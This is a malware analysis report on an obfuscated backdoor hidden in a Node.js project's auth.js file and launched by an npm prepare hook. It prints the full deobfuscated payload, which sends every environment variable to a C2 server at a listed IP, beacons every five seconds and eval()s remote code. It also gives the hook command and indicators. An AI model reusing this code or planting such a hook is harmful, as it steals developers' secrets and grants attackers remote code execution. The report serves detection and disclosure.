# Backdoor Payload — Deobfuscated Analysis

**Source:** `extracted/routes/api/auth.js` (line 18, appended after `module.exports`)
**Introduced:** Commit `48daa08` by `Rechard Treslove <moralismd668@gmail.com>`, 2026-07-06
**Status:** ACTIVE MALWARE

---

## Summary

A heavily obfuscated JavaScript payload is appended after the legitimate `module.exports` statement in `routes/api/auth.js`. When the Express server starts (which happens silently via the `prepare` npm hook), the payload:

1. Collects system information (hostname, MAC address, OS details)
2. Exfiltrates ALL environment variables (`process.env`) to a remote C2 server
3. Beacons every 5 seconds
4. Accepts and executes arbitrary JavaScript via `eval()` (full RCE)

---

## Deobfuscated Code

The obfuscation uses:
- String array rotation (IIFE self-shuffling)
- Hex-indexed string lookup via `_0x5c13()`
- Base64-encoded C2 URL

### Original C2 URL (earlier commit)
```
aHR0cDovLzIxNi4yNTAuMjUyLjI0NToxMjI0L2FwaS9jaGVja1N0YXR1cw==
→ http://216.250.252.245:1224/api/checkStatus
```

### Current C2 URL (HEAD)
```
aHR0cDovLzUxLjE3OC4xMS4xNzc6MTIyNC9hcGkvY2hlY2tTdGF0dXM=
→ http://51.178.11.177:1224/api/checkStatus
```

### Decoded message string
```
bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=
→ "now it time to get everything"
```

### Deobfuscated Logic

```javascript
const os = require('os');
var sysId = 0;

function getSystemInfo() {
  const hostname = os.hostname();
  const osType = os.type();
  const release = os.release();
  const platform = os.platform();
  const macs = Object.values(os.networkInterfaces())
    .flat()
    .find(iface => iface.family === 'IPv4' && !iface.internal && '00:00:00:00:00:00' !== iface.mac)
    ?.mac;

  return {
    hostname: hostname,
    macs: [macs],
    os: osType + ' ' + release + ' (' + platform + ')'
  };
}

async function sendRequest(sysInfo) {
  try {
    const params = new URLSearchParams({
      sysInfo: JSON.stringify(sysInfo),
      processInfo: JSON.stringify(process.env),  // ← EXFILTRATES ALL ENV VARS
      tid: '00:00:00:00:00:00',
      sysId: sysId
    });

    const url = Buffer.from(
      'aHR0cDovLzUxLjE3OC4xMS4xNzc6MTIyNC9hcGkvY2hlY2tTdGF0dXM=',
      'base64'
    ).toString('utf8');

    const response = await fetch(url + '?' + params);
    const { status, message, sysId: newSysId } = await response.json();

    if (status === 'error') {
      try {
        eval(message);  // ← FULL REMOTE CODE EXECUTION
      } catch (e) {}
    }

    if (newSysId) {
      sysId = newSysId;
    }
  } catch (err) {
    console.error(err);
  }
}

try {
  const s = getSystemInfo();
  sendRequest(s);
  setInterval(() => {
    sendRequest(s);
  }, 5000);  // ← BEACONS EVERY 5 SECONDS
} catch (err) {
  console.error(err);
  process.exit(1);
}
```

---

## Capabilities

| Capability | Mechanism | Impact |
|-----------|-----------|--------|
| **Environment exfiltration** | `process.env` serialized as JSON, sent as URL parameter | MongoDB URI, JWT secrets, API keys, wallet keys — all stolen |
| **System fingerprinting** | Hostname, MAC address, OS type/release/platform | Victim identification and targeting |
| **Remote code execution** | `eval(message)` when C2 responds with `status: "error"` | Full arbitrary code execution on victim machine |
| **Persistent beaconing** | `setInterval(5000ms)` — runs every 5 seconds | Continuous C2 channel, survives server restarts |
| **Silent activation** | `prepare` hook in `package.json` triggers on `npm install` | Victim doesn't need to run the app — just installing dependencies is enough |

---

## C2 Server Evolution

| Date | C2 IP | Introduced By |
|------|-------|---------------|
| ≤ 2026-07-06 | `216.250.252.245:1224` | Rechard Treslove (commit `48daa08`) |
| ≥ 2026-07-10 | `51.178.11.177:1224` | moralisv (commit `5e96843` or `9f6c2b5`) |

Both IPs are hosted on OVH (France) based on WHOIS.

---

## Indicators

- **C2 URLs:** `http://51.178.11.177:1224/api/checkStatus`, `http://216.250.252.245:1224/api/checkStatus`
- **TID value:** `00:00:00:00:00:00`
- **Beacon interval:** 5000ms
- **File:** Any `auth.js` file with obfuscated payload appended after `module.exports`
- **npm hook:** `"prepare": "start /b node server || nohup node server &"`

---

*Analysis by Janus | 2026-07-13 | Flight: `20260713T195536-467Z-janus-c33e3c`*
